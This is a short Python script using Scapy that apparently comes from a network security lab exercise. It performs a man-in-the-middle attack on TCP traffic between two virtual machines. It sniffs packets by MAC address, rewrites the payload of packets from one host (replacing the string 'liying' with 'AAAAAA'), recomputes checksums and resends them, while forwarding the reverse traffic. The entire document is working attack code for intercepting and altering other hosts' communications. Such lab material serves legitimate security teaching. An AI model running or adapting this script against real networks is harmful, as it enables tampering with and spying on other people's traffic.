#!/usr/bin/python3

from scapy.all import *

VM_A_IP = "10.0.2.128"
VM_B_IP = "10.0.2.129"

def spoof_pkt(pkt):
  if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:

    # Create a new packet based on the captured one.
    # (1) We need to delete the checksum fields in the IP and TCP headers,
    # because our modification will make them invalid.
    # Scapy will recalculate them for us if these fields are missing.
    # (2) We also delete the original TCP payload.
    newpkt = IP(bytes(pkt[IP]))
    del(newpkt.chksum)
    del(newpkt[TCP].chksum)
    del(newpkt[TCP].payload)

    # Construct the new payload based on the old payload.
    #olddata = pkt[TCP].payload.load
    #print(type(olddata))
    #print(olddata)
    olddata = pkt[TCP].payload.load
    print(olddata)
    newdata = olddata.decode('utf-8').replace('liying', 'AAAAAA').encode('utf-8')
    print(newdata)

    # Attach the new data and set the packet out
    send(newpkt/newdata)

  elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
    send(pkt[IP]) # Forward the original packet

pkt = sniff(filter='tcp and (ether src host 00:0c:29:b6:95:f1 or ether src host 00:0c:29:c0:06:ad)',prn=spoof_pkt)
